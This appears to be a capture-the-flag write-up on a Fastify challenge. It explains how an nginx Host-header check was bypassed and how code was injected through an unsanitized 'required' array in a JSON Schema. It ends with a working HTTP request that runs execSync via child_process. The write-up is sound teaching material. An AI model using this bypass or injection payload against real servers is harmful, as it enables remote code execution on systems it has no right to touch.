# Overview
I didn't manage to get RCE, because I inferred the code to be sanitized properly based on little fuzzing, and that should not happen again.

This is a RCE challenge of a fastify instance, the problem is that the the function code compiler didn't sanitize everything in the schema, only keys of "properties".

There are two challenges here, the first is to bypass nginx config, and the other part is exploit command injection with schema supplied to fastify.

---
# Solution
The first nginx challenge has set "server_name" and read the http header "Host: x" at the same time.

The nginx config:
```
server {
    listen 80 default_server;
    return 404;
}
server {
    server_name *.saas;
    if ($http_host != "easy++++++") { return 403 ;}
    location ~ {
      proxy_pass http://backend:3000;
    }
}
```

Usually the virtual host's name will match the one in "Host" header, but according to Nginx official documentation, the value of `$host` variable will be retrieved from:
1. The hostname in request line
2. "Host" header
3. The "server_name" eventually matched the request.

So we can actually send a request like this to bypass the config:
```
GET http://whatever.saas/flag.php
Host: easy++++++

...
```

---

The second part is where I failed.
According to this part of the source code:
```javascript
fastify.post('/register', {}, async (req, resp) => {
  // can only access from internal.
  const nid = uuid()
  const schema = Object.assign({}, defaultSchema, req.body) // <-- this line here
  console.log(schema)
  customValidators[nid] = validatorFactory({schema}, {mode: 'debug'})
  console.log(customValidators[nid].toString())

  return {route: `/whowilldothis/${nid}`}
})
```

The `req.body` is a object parsed by fastify, and it's being merged into a new object.
I was expecting to exploit prototype pollution here, but fastify seems to be using a default blacklist that blocked `__proto__` and  `prototype`.

And then I noticed the object merging with our data is being used as schema, which will be used to compiled as a validator function.

I knew this is really possible to be the answer, but I didn't really look into the source code of fastify, and that's my biggest mistake.

I built a debug site and try to print out how the compiled function looks like, it is being compiled based on a format called "JSON Schema". It will enumerate the schema and construct a string based on that and put the string into `Function()` to get the validator.

I tried to command injection in the keys of "properties", but the keys are sanitized.
Then, I tried "$id" as well, but the compiled code didn't seem to change.

After the CTF ended, I read other's write-ups, and it turned out I was being very unfortunate.
The keys under "properties" are the only keys that get sanitized, and "$id" need two other keys existing to be put into the code.

So I tracked the source code of fastify this time and found out the "required" array will be put into the compiled function without sanitization, and we can get our RCE there.

My solution:
```
POST /register HTTP/1.1
Host: 192.168.65.1:3000
User-Agent: curl/7.87.0
Accept: */*
Content-Type: application/json
Content-Length: 188
Connection: close

{"properties": {},
"$id": "a",
"required":["the old one']) console.log(global.process.mainModule.require(\"child_process\").execSync(\"calc.exe\"))//"] }
```